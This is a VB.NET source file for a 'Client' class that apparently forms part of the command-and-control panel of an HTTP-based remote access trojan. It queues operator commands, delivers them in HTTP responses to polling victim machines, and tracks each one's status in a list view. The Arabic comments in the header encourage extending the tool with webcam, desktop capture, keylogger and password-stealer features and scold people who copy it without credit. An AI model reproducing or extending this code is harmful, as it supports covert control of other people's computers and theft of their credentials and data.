Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Net
Public Class Client
    '########################################################################################################
    '################## تحياتى للى داخلين مجال البرمجة و هم كل اللى يعرفوه نقطة فى داحل بحر من مبرمج صغير داخل شركة برمجة صغيرة 
    '############################################# تحيتاى لكل من ياخذ نسخ و لصق دون ذكر اى حقوق لصاحب المشروع  و من ثم يقنعوا انفسهم بانهم يفهموا 
    '########################################## تحيتاى لكل شخص يفتحلى فورم و فقط يقعد يلعب فيها و هو ولا فاهم هو بيعمل ايه 
    '################################  احب اقول كلمة لكل هؤلااء الاشخص اللى لا يضيفوا شىء بل يكون عبء على مجال البرمجة, انه فى الاخر بعد تعديله البضين فى هذا المشروع 
    'انه لن يعرف يضيف  اليه خواص جديدة و من ثم فقط انا قد تعلمت كل هذا بنفسى ليس من مشاهدة بل بالقراءة و الفهم و الفهم الجيد 
    'ليس من الجيد ان تقنع نفسك بانك تفهم السورس و بعدها تعدل بالوان بضان زيك و تكتب اسمك عليه 
    'لانه لا يهمنى انا شخصيا لانه اذا همنى ذلك لما كنت لانشر ذلك السورس 
    '########################################################################################################
    '#### تحياتى الحقيقة للمطورين و اقصد المطورين هم من يضيفوا خواص جديدة مثل Webcam , Desktop , Keylogger 
    'او حتى password stealer
    '##############################تحياتى الحقيقة للاشخاص المبدعين اللى يستطيعوا نشر السورس مع ذكر حقوق المبرمج 
    '############### و احب اقول ان لو غيرت الاسم دون تطوير لن يضرنى فقط سيضرك انت لانه ستزال جاهل ههههههههه و لن تطور فى تعليمك للبرمجة
    '
    '
    '
    '
    Public Sub New()
        FUNC.F.Invoke(New x_(AddressOf X))

    End Sub
    Public Function RN(ByVal c As Integer) As String
        Randomize()
        Dim random As New Random
        Dim str3 As String = ""
        Dim str As String = "abcdefghijklmnopqrstuvwxyz"
        Dim num2 As Integer = c
        Dim i As Integer = 1
        Do While (i <= num2)
            str3 = (str3 & str.Chars(random.Next(0, str.Length)))
            i += 1
        Loop
        Return str3
    End Function
    Private Sub T_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles T.Tick

        L_png += 1
        If (Not cx Is Nothing) Then
            Dim sPL As String = FUNC.SPL
            Try
                Try

                    ' MsgBox("Request" & c.cx.Request.ToString)
                    ' MsgBox("Response" & cx.Response.ToString)
                    'MsgBox("CMD" & cmd.Item(0))
                Catch ex As Exception
                    '   MsgBox("EX " & ex.Message)
                End Try

                If (cmd.Count > 0) Then
                    sPL = cmd.Item(0)
                    cmd.RemoveAt(0)
                    Dim writer As New StreamWriter(cx.Response.OutputStream)
                    writer.Write(sPL)
                    writer.Flush()
                    writer.Close()
                    cx.Response.Close()
                    cx = Nothing
                    L_png = 0

                    L.SubItems.Item((L.SubItems.Count - 1)).Text = Strings.Split(sPL, FUNC.SPL, -1, CompareMethod.Binary)(0)
                Else
                    L.SubItems.Item((L.SubItems.Count - 1)).Text = "Ready"
                    If (L_png >= 4) Then
                        Try
                            cx.Response.Close()
                            cx = Nothing
                            L_png = 0
                        Catch ex As Exception
                            cx = Nothing
                            L_png = 0

                        End Try
                    End If
                End If
            Catch ex As Exception
                If (sPL <> "") Then
                    cmd.Insert(0, sPL)
                    cx = Nothing
                    L_png = 0
                End If
            End Try
        ElseIf ((Not L Is Nothing) And (cx Is Nothing)) Then
            Dim png As Integer = L_png
            If (png < 10) Then
                L.SubItems.Item((L.SubItems.Count - 1)).Text = "Ready"
                'L.ForeColor = Color.Gray
            ElseIf (png < 20) Then
                L.SubItems.Item((L.SubItems.Count - 1)).Text = "Pending"
                ' L.ForeColor = Color.LightGray
            ElseIf (png = 50) Then
                L.SubItems.Item((L.SubItems.Count - 1)).Text = "Pending"
                'L.ForeColor = Color.Teal
            ElseIf (png = 70) Then
                L.SubItems.Item((L.SubItems.Count - 1)).Text = "Pending"
                ' L.ForeColor = Color.OrangeRed
            ElseIf (png = 80) Then
                png = 0
                FUNC.Remove((UserAgent & IP), True)
                cx = Nothing
                Return
            End If
        End If

    End Sub
    Protected Friend Sub X()
        T = New Timer
        T.Interval = 52
        T.Start()
    End Sub
    Public cmd As List(Of String) = New List(Of String)
    Public co As String = ""
    Public cx As HttpListenerContext
    Public IP As String
    Public L As ListViewItem
    Public L_png As Integer = 0
    Public UserAgent As String
    Public Delegate Sub x_()
    Public WithEvents T As Timer
End Class
